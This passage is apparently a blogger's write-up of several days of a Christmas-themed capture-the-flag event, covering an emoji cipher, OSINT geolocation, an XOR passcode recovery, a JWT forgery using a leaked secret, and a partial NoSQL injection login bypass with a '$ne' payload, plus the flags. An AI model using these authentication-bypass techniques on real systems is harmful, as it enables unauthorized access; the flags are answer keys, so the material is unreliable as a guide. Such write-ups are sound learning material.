🎄🎨🎭 🎅🎳🔔 🎤🎮🎨 🎰🎨-- 🎮❄️. 🎤🎮🎨 🎥🎅🎸🎭 🎭❄️🔔 🕯️🎶🎅🎉? 🎉🎮🎮🦌 🎁❄️🎮⛄🎁🔔. 🎁🎰🦌{🎄🎅🎉_🎄⛄🎉_🌟🎅🎥_🎄🎮🎦_🎥🔔🎄_🎬🎮🎥_🎥🎅🎦_🎄🎅🎉🎉🎤_🎥🎅🎬🎤_🎥🎮🎬🔔🎸_🎉🎶🎮🎥}

⛄'🎶🎶 🎅🎰🎊 🎵🎤 🔔🎶🎬🔔🎰 🎭🎮 🎭🎅🎊🔔 🎁🎅🎳🔔 🎮🕯️ 🎤🎮🎨🎳 🕯️🎅🎵⛄🎶🎤 🎸🎮🎥.

🦌🎮🎸'🎭 🕯️🎮🎳🎉🔔🎭 🎭🎮 ❄️🎅🎬🔔 🎰🎮🎵🔔 🕯️🎅🎵⛄🎶🎤 🎭⛄🎵🔔!

❄️🎅🎬🔔 🎅 ❄️🎮🎶🎶🎤 🌟🎮🎶🎶🎤 🎁❄️🎳⛄🎰🎭🎵🎅🎰!

🎰🎅🎸🎭🎅
---- 2024 ENCODED ----
```

As you can see, this cipher utilizes emojis to express sentences. Each emoji is assigned a character. By knowing which emoji is which character, you can decode the 2024 message.

I personally did this by hand (hey, I had plenty of time). But you can speed things up by using cryptanalysis tools or Python. After doing some digging, here’s the whole mapping:

```
'🎅' : 'A', '🎄' : 'B', '🎁' : 'C', '🦌' : 'D', '🔔' : 'E', '🕯️' : 'F', '🎉' : 'G', '❄️' : 'H', '⛄' : 'I', '🌟' : 'J', '🎊' : 'K', '🎶' : 'L', '🎵' : 'M', '🎸' : 'N', '🎮' : 'O', '🎲' : 'P', '' : 'Q', '🎳' : 'R', '🎰' : 'S', '🎭' : 'T', '🎨' : 'U', '🎬' : 'V', '🎥' : 'W', '🎦' : 'X', '🎤' : 'Y', '' : 'Z'
```

With that, you can write a Python script to automate the decode process.

```
emoji_mapping = {'🎅' : 'A', '🎄' : 'B', '🎁' : 'C', '🦌' : 'D', '🔔' : 'E', '🕯️' : 'F', '🎉' : 'G', '❄️' : 'H', '⛄' : 'I', '🌟' : 'J', '🎊' : 'K', '🎶' : 'L', '🎵' : 'M', '🎸' : 'N', '🎮' : 'O', '🎲' : 'P', '' : 'Q', '🎳' : 'R', '🎰' : 'S', '🎭' : 'T', '🎨' : 'U', '🎬' : 'V', '🎥' : 'W', '🎦' : 'X', '🎤' : 'Y'}

encoded = """🦌🔔🎅🎳 🎁❄️⛄🎶🦌,

⛄ 🎰🔔🔔 🎤🎮🎨 🦌⛄🦌🎸'🎭 🦌🎮 🎭❄️🔔 🦌🎅⛄🎶🎤 🎁🎭🕯️, 🎊⛄🦌.

🎥🔔🎶🎶, 🎤🎮🎨 🎊🎸🎮🎥 🎥❄️🎅🎭 ❄️🎅🎲🎲🔔🎸🎰 🎸🎮🎥.

🎤🎮🎨 🎰🔔🔔 🎭❄️🎅🎭 🎲🔔🎳🎰🎮🎸 🎮🎨🎭🎰⛄🦌🔔 🎮🕯️ 🎤🎮🎨🎳 🎥⛄🎸🦌🎮🎥?

⛄🎸 🎭❄️🔔 🎥❄️⛄🎭🔔 🎬🎅🎸 🎥⛄🎭❄️ 🎭❄️🔔 🕯️🎳🔔🔔 🎁🎅🎸🦌🎤 🎰⛄🎉🎸?

⛄ ❄️🎅🦌 🎰🎮🎵🔔 🎶🔔🕯️🎭🎮🎬🔔🎳🎰 🕯️🎳🎮🎵 🎁❄️🎳⛄🎰🎭🎵🎅🎰 🎶🎅🎰🎭 🎤🔔🎅🎳.

🎭❄️🔔🎳🔔 🎥🔔🎳🔔 🎭🎮🎸🎰 🎮🕯️ 🎁❄️⛄🎶🦌🎳🔔🎸 🎥❄️🎮 🎲⛄🎁🎊🔔🦌 🎭❄️🔔 🎮🎭❄️🔔🎳 🎮🎲🎭⛄🎮🎸...

🎄🎨🎭 🎄🔔🕯️🎮🎳🔔 🎤🎮🎨 🎉🔔🎭 ⛄🎸, ⛄ 🎵🎨🎰🎭 🎅🎰🎊:

🎅 🕯️🎶🎅🎉 🎮🎳 🎤🎮🎨🎳 🕯️🎅🎵⛄🎶🎤?

🎄🎨🎭 🎅🎳🔔 🎤🎮🎨 🎰🎨-- 🎮❄️. 🎤🎮🎨 🎥🎅🎸🎭 🎭❄️🔔 🕯️🎶🎅🎉? 🎉🎮🎮🦌 🎁❄️🎮⛄🎁🔔. 🎁🎰🦌{🎄🎅🎉_🎄⛄🎉_🌟🎅🎥_🎄🎮🎦_🎥🔔🎄_🎬🎮🎥_🎥🎅🎦_🎄🎅🎉🎉🎤_🎥🎅🎬🎤_🎥🎮🎬🔔🎸_🎉🎶🎮🎥}

⛄'🎶🎶 🎅🎰🎊 🎵🎤 🔔🎶🎬🔔🎰 🎭🎮 🎭🎅🎊🔔 🎁🎅🎳🔔 🎮🕯️ 🎤🎮🎨🎳 🕯️🎅🎵⛄🎶🎤 🎸🎮🎥.

🦌🎮🎸'🎭 🕯️🎮🎳🎉🔔🎭 🎭🎮 ❄️🎅🎬🔔 🎰🎮🎵🔔 🕯️🎅🎵⛄🎶🎤 🎭⛄🎵🔔!

❄️🎅🎬🔔 🎅 ❄️🎮🎶🎶🎤 🌟🎮🎶🎶🎤 🎁❄️🎳⛄🎰🎭🎵🎅🎰!

🎰🎅🎸🎭🎅"""

message = ""

for char in encoded:
 if char in emoji_mapping.keys():
 message += emoji_mapping[char]
 else:
 message += char

print(message)
```

Note: For some reason, it couldn’t translate the ‘H’ and ‘F’s. I’m not sure why. But you can infer them anyway. The final decoded message is:

```
I SEE YOU DIDN'T DO THE DAILY CTF, KID.

WELL, YOU KNOW WHAT HAPPENS NOW.

YOU SEE THAT PERSON OUTSIDE OF YOUR WINDOW?

IN THE WHITE VAN WITH THE FREE CANDY SIGN?

I HAD SOME LEFTOVERS FROM CHRISTMAS LAST YEAR.

THERE WERE TONS OF CHILDREN WHO PICKED THE OTHER OPTION...

BUT BEFORE YOU GET IN, I MUST ASK:

A FLAG OR YOUR FAMILY?

BUT ARE YOU SU-- OH. YOU WANT THE FLAG? GOOD CHOICE. CSD{BAG_BIG_JAW_BOX_WEB_VOW_WAX_BAGGY_WAVY_WOVEN_GLOW}

I'LL ASK MY ELVES TO TAKE CARE OF YOUR FAMILY NOW.

DON'T FORGET TO HAVE SOME FAMILY TIME!

HAVE A HOLLY JOLLY CHRISTMAS!

SANTA
```

Flag: csd{BAG_BIG_JAW_BOX_WEB_VOW_WAX_BAGGY_WAVY_WOVEN_GLOW}

### Day 13: **Disoriented Santa**
> 
**Category: **OSINT
**Points: 100Author: **thee2d

Sorry that we woke you up at this hour, but Santa is missing. We suspect the K.U.N.A.L Secret Society kidnapped Santa when he was flying over Europe while scoping out for some children.

Thankfully, Santa was equipped with a state-of-the-art GPS tracker circa 2008. Anyways, it gave us these clues:

Santa is trapped in a history museum.
The museum charges 3 EUR for entry.
There is a library within 1 km of the museum.

Can you find the coordinates of the museum? The flag is in the format `csd{latitude,longitude}`, where each number is rounded (not truncated) to 3 decimal places. Numbers within an error of ±0.001 are accepted.

For example, a flag could be `csd{11.533,-125.396}`.

**Hint 1:** Open-source maps like OpenStreetMap contain useful information related to businesses and other places. You can query these maps using tools like [Overpass Turbo](https://overpass-turbo.eu/) to analyze these data given a filter you define.
**Hint 2:** [Overpass Turbo](https://overpass-turbo.eu/) supports filtering by [OpenStreetMap tags](https://wiki.openstreetmap.org/wiki/Tags). Some tags may be useful to this challenge, such as `tourism` and `charge`.

Consider this query:

```
[out:json][timeout:25];

node["charge"="<charge>"]["tourism"="<tourism>"]();
 
out body;
>;
out skel qt;
```

Given all the descriptions, you could do some manual research. However, the 2 hints, especially the 2nd one, made this straightforward. I used their example query to craft my own query (thanks ChatGPT):

```
[out:json][timeout:25];

// Find history museums with a charge of 3 EUR
node["tourism"="museum"]["museum"="history"]["charge"="3 EUR"]({{bbox}});
out center;

// Find libraries within 1 km of those museums
node["amenity"="library"](around:1000);
out center;
```

This filtered out the one and only museum that fits all the criteria.

I took the latitude and longitude values and submitted them as the flags.

Flag: csd{48.204,7.364}

### Day 14: **angry elf**
> 
**Category: **Reverse engineering
**Points: 50Author: **qvipin

Elf Glaki went rouge! At 2:56 PM EST, he locked up all our flags! Luckily you’re not an idiot and you can fix this in 3 minutes. Stop this Angry Elf ASAP!

`nc ctf.csd.lol 1147` (uhh kinda broken but works, will fix soon)

**Hint 1:** Try decompiling with dogbolt.org, should be a similar process of solving to screaming
**Hint 2:** There is 2 ways of solving, try looking at the decomplication outputs.

This is a password checker challenge. Upon decompiling in Ghidra, I found two functions: `main `and `validate_passcode`. In the `validate_passcode` function, the key logic revolves around checking if the input passcode matches an obfuscated key using XOR-based operations. To successfully reverse the program and derive the correct passcode, you need to reverse the XOR operation with the `obfuscated_key` array.

The program compares your passcode (obfuscated input passcode) against a predefined array `obfuscated_key`. However, in Ghidra, I couldn’t find the value of `obfuscated_key` anywhere. So I used **pwndbg** to reveal it.

From the disassembly, we can see that `RCX` holds the base address of `obfuscated_key`.

I launched the binary in pwndbg and set a breakpoint at this function, ran the program, and stepped through it.

```
pwndbg ./kringle
b validate_passcode
run
si
```

Until I reached the line where the value of obfuscated_key is loaded into RCX. After passing that line, I printed the value stored at RCX.

```
info registers rcx
```

That revealed the value of obfuscated_key.

Then it’s just a matter of XOR-ing the values with 0x7f to reveal the correct passcode. I used this Python code:

```
# XOR each byte of the obfuscated_key with 0x7f
obfuscated_key = [0xf, 0xd, 0x16, 0x11, 0x18, 0x13, 0x1a, 0xc, 0x4f, 0x46, 0x5c]

passcode = ''.join(chr(byte ^ 0x7f) for byte in obfuscated_key)

print("Recovered Passcode:", passcode)
```

Got the correct passcode. Now connect to the server and enter the passcode to get the flag.

Flag: csd{4N9ry_3lf5_5h0uLdNT_83_M3553D_w1tH}

### Day 15: JETS
> 
**Category: **Web exploitation
**Points: 70Author: **thee2d

It seems like the Secret Society of K.U.N.A.L has invested in another business…Oh no.

If those planes come anywhere close to Santa — after his “adventure” in France — he’ll be scathed for good. Those reindeer don’t like inhaling kerosene!

Agent, we need you to infiltrate their system and gather some information for our engineers at Elves Intelligence. We believe the plane they’re using is a bit special…it may have been custom-built for K.U.N.A.L himself!

Here’s their website, agent: [https://jets.csd.lol/](https://jets.csd.lol/). Best of luck.

*You are only allowed to test in the scope *`*https://jets.csd.lol/**`*. Blind brute-force request sending (e.g. using tools like DirBuster) can trigger Cloudflare rate limits. Do not attempt to bypass Cloudflare limits. Therefore, if you wish to brute-force, please limit your wordlists or attack scope.*

Hint 1: Try looking at `/script.js`; there's a special username in there! Is it possible to login as that special user? Your browser’s DevTools will help solve this challenge.
Hint 2: What’s a [JSON Web Token](https://en.wikipedia.org/wiki/JSON_Web_Token)? Look closely at `/script.js`; the developer might've left something in there by accident!

This challenge involved forging a JWT token using the sub and secret revealed in the script.js file:

```
import { jwtDecode } from "https://cdn.jsdelivr.net/npm/jwt-decode@4.0.0/+esm";

function getCookie(name) {
 const value = `; ${document.cookie}`;
 const parts = value.split(`; ${name}=`);
 if (parts.length === 2) return parts.pop().split(";").shift();
}

const signupButton = document.getElementById("signup");
const form = document.getElementById("form");
const footer = document.getElementById("footer");
const userText = document.getElementById("user-text");
const planes = document.getElementById("planes");

const token = getCookie("token");

if (token) {
 const { sub } = jwtDecode(token, {
 secret: atob("MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ=="),
 });
 console.log(sub);

 if (sub === atob("S1VuNEw=")) {
 footer.style.display = "block";
 }

 signupButton.style.display = "none";
 userText.style.display = "block";
 userText.innerHTML = `G&apos;day, <strong>${sub}</strong>`;

 const res = await fetch("/my-planes");
 const json = await res.json();

 planes.style.display = "grid";
 console.log(json);

 for (const [index, plane] of json.planes.entries()) {
 const element = document.getElementById(index + 1);
 element.style.display = "block";

 const name = document.getElementById(`${index + 1}-text`);
 name.innerText = plane.name;

 const image = document.getElementById(`${index + 1}-image`);
 image.src = plane.image;
 }
}

signupButton.addEventListener("click", () => {
 form.style.display = "block";
});

form.addEventListener("submit", async (e) => {
 e.preventDefault();

 const username = document.getElementById("username").value;
 const password = document.getElementById("password").value;

 const response = await fetch("/signup", {
 method: "POST",
 headers: { "Content-Type": "application/json" },
 body: JSON.stringify({ username, password }),
 });

 alert(await response.text());

 location.reload();
});
```

First, you need to sign up with any username and password. Then, open the devtools using F12 on your keyboard. Copy the cookie value.

Now go to [jwt.io](http://jwt.io/) and paste the token. On the sub, input KUn4L (we found this in script.js by decoding `S1VuNEw=` from Base64. In the signature tab, enter the decoded signature (decode `MWRkMjJiYjQyNzBjYjE0NTcyMzIyZTAzNDI1YzAwNTgzZTAyYmY2M2Y1YzdhZjdkMmYzODdlMjRlN2Q1YjkzMQ==`).

Copy the generated token value and paste it into your browser’s dev tools (from where you copied the previous token). Now, reload the browser. You should now be logged in as KUn4L. The flag is written in the image.

Flag: csd{Wh47_D1D_KUN4l_do_7h1S_71M3}

### Day 17: **Santa’s Plane**
> 
**Category: **OSINT
**Points: 80Author: **ladderlogic

Santa cargo plane is running into issues can mechanical problems. Can you figure out his plane model. Please include the variant in the answer.

Hint 1: We see that rank maybe a military plane?
Hint 2: What US planes are currently being used for cargo transit

We’re given two images, one showing some machines and the other a snippet of a plane's cockpit. Now, honestly, I lucked out of this challenge. The second image was a bit useless for me. Here’s the first image.

The heading ‘Cpl Kenneth P. Sm___’ hinted that it’s a military plane (later revealed in Hint 1). Hint 2 was the biggest breakthrough for me.

I first made a summary of the challenge and shared it with ChatGPT. From the description of the problem, ChatGPT suggested a few models:

- **C-130 Hercules** (variants: C-130J, C-130H, AC-130 for special operations)

- **C-17 Globemaster III** (heavy-lift transport)

- **C-5 Galaxy** (largest transport plane, multi-deck)

I then searched ‘us planes cargo transit’ on Google and found this [Wiki page](https://en.wikipedia.org/wiki/List_of_active_United_States_military_aircraft). It had some vital information regarding the challenge. I started with ChatGPT’s suggestions and found them all in that list.

I started brute forcing for different plane models and finally [C-130J Hercules](https://en.wikipedia.org/wiki/Lockheed_Martin_C-130J_Super_Hercules) worked.

I still haven’t found any decisive evidence or methodology to find the correct answer. But hey, if it’s correct, it’s correct.

Flag: csd{c130j}

### Day 20: **Lost Santa**
> 
**Category: **OSINT
**Points: 80Author: **ladderlogic

Santa got lost on his way to the largest hacking conference. He was out cycling and got lost and all we have is this picture of him can you help us find him?

Round to 3 decimal places in cords. IE csd{10.111,-23,400} DO NOT TRUNCATE, leave all zeros and negative

Hint 1: What cycling event is there?
Hint 2: What is the largest hacking conference?

You’re provided with an image of some mountains.

From reverse image searching, I came to know that this place is somewhere called **Red Rock Canyon National Conservation Area** in Las Vegas, Nevada. The hints also point to the same.

I started playing around the nearby areas on Google Maps. After some digging around, I found that the latitude and longitudes will be 36.XXX and -115.XXX. Then came the bigger challenge.

Being a mountain area, there weren’t many places you could see in the satellite view to pinpoint the exact place.

This place was giving the values 36.1944273,-115.4408716 which was close but still not correct. After doing some more reverse image searching, I found some almost exact matches on Flickr.

Another interesting thing I found on Flickr is that you can actually see the picture on a map, where it was taken including the lat and lon. Nice.

After going through the Flickr Rabbit hole and searching for exact matches, I found this picture taken by Ricardo Villalobo (Thanks, Ricardo).

Then I searched for the lat lon of the picture on Flickr.

I got 36.117252, -115.444978, which was the answer.

Flag: csd{36.117,-115.444}

### Day 22: **K.U.N.A.L Consulting (partial)**
> 
**Category: **Web exploitation
**Points: 115Author: **thee2d

<REDACTED FOR BREVITY>

It seems like the society has been running a consulting firm…targeted at children. We can’t change the past for Aspen, but you can prevent this for the thousands of other elves. Good luck, agent: [https://kunal-consulting.csd.lol/](https://kunal-consulting.csd.lol/).

**Hint 1:** User input should never be trusted, especially not for authentication! As always, check out your browser’s DevTools (particularly the Elements, Sources, and Network tabs).
**Hint 2:** JSON is all powerful; there’s more to it than strings. There’s also an “employee login” page. Humans don’t always have the best memory and might re-use stuff.

We’re given a website containing two login panels: one for customers and the other for employees.

There are some JavaScript codes available that give you some sort of idea of how the validations work here.

```

// login.script.js

const submitBtn = document.getElementById("submit");

submitBtn.addEventListener("click", async () => {
 const username = document.getElementById("username").value;
 const password = document.getElementById("password").value;

 // don't waste precious cpu cycles on the server
 if (username.length > 7 || password.length > 100) return alert("Invalid username/password");

 const response = await fetch("/login", {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({ username, password }),
 });

 const text = await response.text();
 alert(text);

 if (response.status === 200) window.location.href = "/";
});

// ----------------------------------------------------------

// employee-login.script.js

const submitBtn = document.getElementById("submit");

submitBtn.addEventListener("click", async () => {
 const username = document.getElementById("username").value;
 const password = document.getElementById("password").value;

 // don't waste precious cpu cycles on invalid usernames/passwords
 if (!/^[A-z0-9_]{1,16}$/.test(username)) return alert("Incorrect username/password");
 if (!/^[A-z0-9_]{1,128}$/.test(password)) return alert("Incorrect username/password");

 const response = await fetch("/employee-login", {
 method: "POST",
 headers: {
 "Content-Type": "application/json",
 },
 body: JSON.stringify({ username, password }),
 });

 const text = await response.text();
 alert(text);

 if (response.status === 200) window.location.href = `/employee-area?username=${username}&password=${password}`;
});
```

From Wappalyzer, I cam to know that the site is used Node/Express in the Backend. From the given hints, we can assume there’s some sort of vulnerability in the login forms that will let us bypass the login restrictions.

So I opened Burp Suite and started sending various kinds of payloads through the repeater until I saw something interesting. I sent the following payload:

```
{
"username":"admin",
 "password":""""
}
```

Which resulted in a syntax error.

```
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Expected &#39;,&#39; or &#39;}&#39; after property value in JSON at position 36 (line 2 column 15)<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/node_modules/body-parser/lib/types/json.js:92:19)<br> &nbsp; &nbsp;at /node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:211:14)<br> &nbsp; &nbsp;at invokeCallback (/node_modules/raw-body/index.js:238:16)<br> &nbsp; &nbsp;at done (/node_modules/raw-body/index.js:227:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/node_modules/raw-body/index.js:287:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:524:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1698:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:90:21)</pre>
</body>
</html>
```

This made me think, perhaps there might be some kind of injection vulnerability here (I can be wrong). With that in mind, I sent this NoSQL injection payload.

```
{"username":{"$ne":""}, "password":{"$ne":""}}
```

And voila, I was able to log in as a customer.

This JSON payload uses a **MongoDB query operator** (`$ne`), which stands for "not equal." The payload essentially tells the backend to check if the `username` is **not equal** to an empty string (`""`) and the `password` is **not equal** to an empty string (`""`).

If the backend directly passes the `username` and `password` fields into a MongoDB query without sanitizing or validating them, it interprets the input as part of the query. For example, the query might look something like this:

```
db.users.findOne({ username: { $ne: "" }, password: { $ne: "" } })
```

The `$ne` operator matches any document where the field is not equal to the specified value. As a result, the query might return the first user in the database, effectively bypassing authentication.

The backend likely **trusts user-provided input** and inserts it directly into the query without sanitization. Instead of treating `{"$ne": ""}` as a literal value, the backend interprets it as part of the query logic, allowing you to bypass the intended username and password checks.

The vulnerability here is a form of **NoSQL Injection**, where untrusted user input is embedded into a NoSQL query, enabling attackers to manipulate the query logic.

Okay, we’re almost there.

**NOTE:** I couldn’t solve it after this.

---
